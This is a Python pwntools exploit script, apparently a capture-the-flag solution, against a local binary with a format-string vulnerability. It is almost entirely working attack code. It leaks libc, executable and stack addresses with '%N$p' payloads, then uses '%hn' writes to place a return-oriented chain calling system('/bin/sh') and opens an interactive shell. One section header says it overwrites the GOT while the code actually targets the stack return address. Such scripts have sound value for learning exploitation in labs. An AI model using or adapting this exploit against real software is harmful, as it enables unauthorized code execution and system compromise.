**script:**

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./source_patched")
libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so")
p = process([exe.path])

context.binary = exe

gdb.attach(p, gdbscript = '''
b*main+168
b*main+94
c
''')

input()


##################################
### Stage 1: leak libc address ###
##################################

p.sendafter(b'Enter text to convert: \n',b'%11$p') # leak _libc_start_main_ret
p.recvline()
p.recvuntil(b'Your name: ')
libc_leak = int(p.recvline()[:-2], 16)
libc.address = libc_leak - 0x29d90
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

##################################
### Stage 2: leak exe  address ###
##################################

p.sendlineafter(b'Enter text to convert: \n',b'%9$p')
p.recvline()
p.recvuntil(b'Your name: ')
exe_leak = int(p.recvline()[:-1], 16)
exe.address = exe_leak - 0x10c0
log.info("exe leak: " + hex(exe_leak))
log.info("exe base: " + hex(exe.address))

##################################
### Stage 3: leak stack address ##
##################################

pop_rdi = 0x000000000002a3e5 + libc.address

p.sendlineafter(b'Enter text to convert: \n',b'%15$p')
p.recvline()
p.recvuntil(b'Your name: ')
stack_leak = int(p.recvline()[:-1], 16)
rip_addr = stack_leak - 0x110
log.info("stack leak: " + hex(stack_leak))
log.info("rip leak: " + hex(rip_addr))


##################################
###   Stage 4: Overwrite GOT   ###
##################################


#gán 6 byte của pop rdi vào rip
for i in range(0, 3):
        log.info("pop rdi: " + hex(pop_rdi))
        payload = f'%{pop_rdi & 0xffff}c%8$hn'.encode().ljust(16, b'\0') 
        payload += p64(rip_addr + 2*i)
        p.sendlineafter(b'Enter text to convert: \n', payload )
        pop_rdi = pop_rdi >> 16


rip_addr += 8 # nhảy qua stack mới
binsh = next(libc.search(b"/bin/sh\0"))

#gán tiếp 6 byte của /bin/sh vào stack tiếp theo
for i in range(0, 3):
        log.info("/bin/sh: " + hex(binsh))
        payload = f'%{binsh & 0xffff}c%8$hn'.encode().ljust(16, b'\0') 
        payload += p64(rip_addr + 2*i)
        p.sendlineafter(b'Enter text to convert: \n', payload )
        binsh = binsh >> 16


rip_addr += 8 # nhảy qua stack mới
ret_libc = libc.address + 0x0000000000029cd6

#gán tiếp 6 byte của ret vào stack tiếp theo
for i in range(0, 3):
        log.info("ret: " + hex(ret_libc))
        payload = f'%{ret_libc & 0xffff}c%8$hn'.encode().ljust(16, b'\0') 
        payload += p64(rip_addr + 2*i)
        p.sendlineafter(b'Enter text to convert: \n', payload )
        ret_libc = ret_libc >> 16

rip_addr += 8 # nhảy qua stack mới
system = libc.sym['system'] + 4

#gán tiếp 6 byte của system vào stack tiếp theo

for i in range(0, 3):
        log.info("system: " + hex(system))
        payload = f'%{system & 0xffff}c%8$hn'.encode().ljust(16, b'\0') 
        payload += p64(rip_addr + 2*i)
        p.sendlineafter(b'Enter text to convert: \n', payload )
        system = system >> 16


p.sendlineafter(b'Enter text to convert: \n', b'a'*29 ) #nhập quá 29byte để thoát vòng lặp trỏ đến return 

p.interactive()




```
